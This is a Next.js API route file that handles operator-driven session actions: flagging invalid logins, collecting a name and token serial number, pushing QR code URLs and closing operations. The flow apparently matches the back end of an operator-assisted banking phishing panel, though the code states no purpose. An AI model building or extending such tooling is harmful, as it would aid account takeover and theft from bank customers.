// src/app/api/operando/[action]/route.ts
import { NextResponse } from 'next/server';
import { ClientSessionRepository } from '../repositories/ClientSessionRepository';
import { ClientUserRepository } from '../repositories/ClientUserRepository';
import { EnsureSessionService } from '../services/EnsureSessionService';
import { BadRequestError } from '../services/erros';
import { UpdateFlagsService } from '../services/UpdateFlagsService';

type Ctx = { params: Promise<{ action: string }> }

export async function POST(req: Request, context: Ctx) {
  try {
    const { action } = await context.params
    const body = (await req.json().catch(() => ({}))) as {
      sessionId?: string
      operatedById?: string
      name?: string
      numSerie?: string
      qrCodeUrl?: string
      tokenType?: "CELULAR" | "TOKEN" 
    }
    const { sessionId, operatedById } = body
    if (!sessionId) {
      throw new BadRequestError('sessionId é obrigatório no body.')
    }
    const ensure = new EnsureSessionService()
    const flags = new UpdateFlagsService()
    const users = new ClientUserRepository()
    const sessions = new ClientSessionRepository() 
    
    await ensure.run(sessionId, operatedById)
    switch (action) {
      case 'invalid-login': {
        const data = await flags.invalidLogin(sessionId)
        return NextResponse.json({ ok: true, data })
      }
      case 'request-token': {
          const { name, numSerie, tokenType } = body
          if (!name || !numSerie || !tokenType) {
            throw new BadRequestError('Campos obrigatórios: name, numSerie e tokenType.')
          }
          await users.upsertNameNumSerie(sessionId, name, numSerie, operatedById)
          await sessions.updateTokenType(sessionId, tokenType) // ✅ novo update no sessionData
          const data = await flags.requestTokenOK(sessionId)
          return NextResponse.json({ ok: true, data })
        }
      case 'invalid-token': {
        const data = await flags.invalidToken(sessionId)
        return NextResponse.json({ ok: true, data })
      }
      case 'request-qrcode': {
        const { qrCodeUrl } = body
        if (!qrCodeUrl || typeof qrCodeUrl !== 'string' || !qrCodeUrl.trim()) {
          throw new BadRequestError('Campo obrigatório: qrCodeUrl.')
        }
        const data = await flags.requestQrCodeOK(sessionId, qrCodeUrl.trim())
        return NextResponse.json({ ok: true, data })
      }
      case 'update-qrcode': { // ✅ nova rota
          const { qrCodeUrl } = body
          if (!qrCodeUrl || typeof qrCodeUrl !== 'string' || !qrCodeUrl.trim()) {
            throw new BadRequestError('Campo obrigatório: qrCodeUrl.')
          }
          const data = await flags.updateQrCode(sessionId, qrCodeUrl.trim())
          return NextResponse.json({ ok: true, data })
        }
      case 'invalid-qrcode': {
        const data = await flags.invalidQrCode(sessionId)
        return NextResponse.json({ ok: true, data })
      }
      case 'done-operation': {
        const data = await flags.doneOperation(sessionId)
        return NextResponse.json({ ok: true, data })
      }
      case 'restart-user': {
        const data = await sessions.deleteAllBySessionId(sessionId)
        return NextResponse.json({ ok: true, data })
      }
      default:
        throw new BadRequestError('Ação inválida.')
    }
  } catch (err: any) {
    const message = err instanceof BadRequestError ? err.message : 'Erro interno'
    const status = err instanceof BadRequestError ? 400 : 500
    return NextResponse.json({ ok: false, error: message }, { status })
  }
}
